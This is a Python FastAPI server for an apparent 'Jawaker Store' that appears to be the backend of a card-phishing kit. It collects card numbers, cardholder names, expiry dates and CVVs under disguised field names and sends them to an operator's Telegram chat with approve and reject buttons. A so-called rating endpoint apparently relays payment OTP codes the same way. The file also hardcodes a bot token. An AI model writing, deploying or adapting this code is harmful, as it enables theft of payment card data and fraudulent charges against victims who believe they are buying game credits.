import os
import time
import uuid
import asyncio
from contextlib import asynccontextmanager
from typing import Dict, Any

import httpx
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import uvicorn

# ------------------ الإعدادات ------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9154524424:AAGc3lOaznU7eMV-aQEm-eHHJmZDmX4K9KE")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 8992323424))
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
ORDER_TTL_SECONDS = 3600  # مدة الاحتفاظ بالطلب في الذاكرة (ساعة واحدة)

# تخزين مؤقت بالذاكرة. ⚠️ لو السيرفر بعمل restart، الطلبات المعلّقة بتضيع.
orders: Dict[str, Dict[str, Any]] = {}
orders_lock = asyncio.Lock()
http_client: httpx.AsyncClient | None = None


async def cleanup_expired_orders() -> None:
    while True:
        await asyncio.sleep(300)
        now = time.time()
        async with orders_lock:
            expired = [
                oid for oid, data in orders.items()
                if now - data.get("created_at", now) > ORDER_TTL_SECONDS
            ]
            for oid in expired:
                orders.pop(oid, None)


@asynccontextmanager
async def lifespan(app: FastAPI):
    global http_client
    http_client = httpx.AsyncClient(
        timeout=httpx.Timeout(connect=3.0, read=6.0, write=6.0, pool=3.0),
        limits=httpx.Limits(max_connections=100, max_keepalive_connections=20),
    )
    cleanup_task = asyncio.create_task(cleanup_expired_orders())
    try:
        yield
    finally:
        cleanup_task.cancel()
        if http_client:
            await http_client.aclose()


app = FastAPI(title="Jawaker Store FastAPI Backend", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


def build_admin_message(order_id: str, payload: dict) -> str:
    order_info = payload.get("order") or {}

    month = payload.get("joinDay") or payload.get("month") or payload.get("expMonth") or "-"
    year = payload.get("joinMonth") or payload.get("year") or payload.get("expYear") or "-"
    cvv = payload.get("joinYear") or payload.get("cvv") or payload.get("cvc") or "-"

    first_name = payload.get("firstNameRecord") or payload.get("firstName") or ""
    last_name = payload.get("lastNameRecord") or payload.get("lastName") or ""
    full_billing_name = f"{first_name} {last_name}".strip() or "-"

    return (
        "💳 طلب دفع جديد 🟢\n"
        "------------------------------------\n"
        f"رقم الطلب: {order_id}\n"
        f"الفئة: {order_info.get('name', '-')}\n"
        f"الكمية: {order_info.get('amount', '-')}\n"
        f"السعر: {order_info.get('price', '-')}\n"
        "------------------------------------\n"
        f"🆔 ID اللاعب: {payload.get('id', '-')}\n"
        f"👤 اسم صاحب البطاقة: {payload.get('jawakerName', '-')}\n"
        f"💳 رقم البطاقة: {payload.get('jawakerNumber', '-')}\n"
        f"📅 تاريخ الانتهاء (MM/YY): {month}/{year}\n"
        f"🔒 رمز الأمان (CVV): {cvv}\n"
        "------------------------------------\n"
        f"🌍 الدولة: {payload.get('country', '-')}\n"
        f"📝 اسم الفاتورة: {full_billing_name}"
    )


async def telegram_post(method: str, json_data: dict) -> None:
    assert http_client is not None
    resp = await http_client.post(f"{TELEGRAM_API}/{method}", json=json_data)
    resp.raise_for_status()


@app.get("/")
async def health():
    return {"status": "running"}


@app.post("/api/order")
async def create_order(request: Request):
    try:
        payload = await request.json()
    except Exception:
        payload = {}

    if not isinstance(payload, dict):
        payload = {}

    order_id = str(uuid.uuid4())[:8]

    async with orders_lock:
        orders[order_id] = {"status": "pending", "created_at": time.time()}

    text = build_admin_message(order_id, payload)
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ تأكيد", "callback_data": f"approve:{order_id}"},
            {"text": "❌ رفض", "callback_data": f"reject:{order_id}"},
        ]]
    }

    try:
        await telegram_post(
            "sendMessage",
            {
                "chat_id": ADMIN_CHAT_ID,
                "text": text,
                "reply_markup": keyboard,
            },
        )
    except httpx.HTTPError as e:
        async with orders_lock:
            orders.pop(order_id, None)
        print(f"Telegram API Error: {e}")
        return JSONResponse(
            status_code=502,
            content={"error": f"telegram_send_failed: {e}"},
        )

    return {"order_id": order_id}


@app.get("/api/order/{order_id}")
async def get_order_status(order_id: str):
    async with orders_lock:
        order = orders.get(order_id)
    if not order:
        raise HTTPException(status_code=404, detail="not_found")
    return {"status": order["status"]}


@app.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    try:
        update = await request.json()
    except Exception:
        update = {}

    callback = update.get("callback_query") if isinstance(update, dict) else None
    if not callback:
        return {"ok": True}

    data = callback.get("data", "")
    callback_id = callback.get("id")
    message = callback.get("message") or {}
    chat_id = (message.get("chat") or {}).get("id")
    message_id = message.get("message_id")
    old_text = message.get("text", "")

    if ":" not in data:
        return {"ok": True}

    action, order_id = data.split(":", 1)

    note = None
    async with orders_lock:
        order = orders.get(order_id)
        if order and order["status"] == "pending":
            if action == "approve":
                order["status"] = "approved"
                note = "\n\n✅ تم التأكيد"
            elif action == "reject":
                order["status"] = "rejected"
                note = "\n\n❌ تم الرفض"

    tasks = []

    if callback_id:
        tasks.append(
            telegram_post(
                "answerCallbackQuery",
                {"callback_query_id": callback_id, "text": "تم تسجيل قرارك بنجاح!"},
            )
        )

    if note and chat_id and message_id:
        tasks.append(
            telegram_post(
                "editMessageText",
                {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": old_text + note,
                    "reply_markup": {"inline_keyboard": []},
                },
            )
        )

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, Exception):
                print(f"Telegram Webhook Error: {res}")

    return {"ok": True}


@app.post("/api/rating")
async def receive_rating(request: Request):
    try:
        payload = await request.json()
    except Exception:
        payload = {}

    if not isinstance(payload, dict):
        payload = {}

    order_id = payload.get("order_id", "-")
    otp_code = payload.get("rating", "-")

    text = (
        "🔑 رمز الـ OTP جديد (FastPay)\n"
        "------------------------------------\n"
        f"🆔 رقم الطلب: {order_id}\n"
        f"🔢 الرمز المدخل: {otp_code}"
    )

    try:
        await telegram_post(
            "sendMessage",
            {"chat_id": ADMIN_CHAT_ID, "text": text},
        )
    except httpx.HTTPError as e:
        print(f"Error sending OTP: {e}")

    return {"status": "success"}


if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 5000)),
        reload=False,
    )
